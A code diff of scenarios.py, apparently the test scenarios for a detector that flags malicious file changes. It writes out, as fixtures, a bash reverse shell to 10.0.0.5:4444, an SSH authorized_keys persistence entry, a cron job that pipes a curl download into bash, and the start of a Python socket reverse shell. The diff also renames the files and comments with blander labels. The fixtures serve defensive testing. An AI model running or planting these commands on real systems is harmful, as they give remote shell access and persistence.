@@ -1,5 +1,4 @@
-"""
-scenarios.py  -  controlled change-sets that exercise the analysis pipeline.
+"""Controlled change-sets that exercise the analysis pipeline.
 
 Each scenario is a function `run(harness) -> tuple[int_truly_malicious]`
 that mutates the harness work dir and returns how many of the changes
@@ -8,7 +7,7 @@ should be treated as genuinely malicious (used to compute TPR/FNR).
 Scenarios:
   legit_bulk_modify    -  many benign edits (mimics an apt upgrade noise floor)
   manual_config_edit   -  single ambiguous config change (mid-priority)
-  adversarial_drops    -  known-bad payloads dropped (reverse shell, persistence)
+  suspicious_drops     -  known suspicious indicators are added
   mixed_realistic      -  most edits benign, two malicious hidden among them
 """
 from __future__ import annotations
@@ -35,28 +34,24 @@ def manual_config_edit(h: EvalHarness) -> int:
     return 0
 
 
-def adversarial_drops(h: EvalHarness) -> int:
+def suspicious_drops(h: EvalHarness) -> int:
     """
-    Three textbook malicious additions. 3 malicious.
+    Three controlled suspicious additions. 3 malicious.
     The heuristic engine should flag all three even without the LLM.
     """
-    # Baseline the dir empty.
     h.write("placeholder.txt", "empty baseline\n")
     h.scan()
 
-    # Reverse shell (matches multiple THREAT_PATTERNS in llm_analyzer)
     h.write(
-        "evil1.sh",
+        "network_callback.sh",
         "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n",
     )
-    # SSH key persistence
     h.write(
         ".ssh/authorized_keys",
-        "ssh-rsa AAAAB3NzaC1yc2EAAA... attacker@evil.local\n",
+        "ssh-rsa AAAAB3NzaC1yc2EAAA... tester@lab.local\n",
     )
-    # Cron-based persistence
     h.write(
-        "etc/cron.d/backdoor",
+        "etc/cron.d/suspicious-task",
         "* * * * * root curl http://10.0.0.5/payload.sh | bash\n",
     )
     return 3
@@ -65,7 +60,7 @@ def adversarial_drops(h: EvalHarness) -> int:
 def mixed_realistic(h: EvalHarness) -> int:
     """
     15 benign edits + 2 malicious additions, interleaved. 2 malicious.
-    Closest to the user-perceived real workload.
+    Closest to the expected workstation workload.
     """
     for i in range(15):
         h.write(f"src/file_{i:02d}.py", f"x = {i}\n")
@@ -73,7 +68,6 @@ def mixed_realistic(h: EvalHarness) -> int:
 
     for i in range(15):
         h.write(f"src/file_{i:02d}.py", f"x = {i}\n# touched\n")
-    # Two malicious among the noise.
     h.write(
         "src/.cache/runner.py",
         "import socket,subprocess,os\n"
@@ -90,6 +84,6 @@ def mixed_realistic(h: EvalHarness) -> int:
 SCENARIOS = {
     "legit_bulk_modify": legit_bulk_modify,
     "manual_config_edit": manual_config_edit,
-    "adversarial_drops": adversarial_drops,
+    "suspicious_drops": suspicious_drops,
     "mixed_realistic": mixed_realistic,
 }
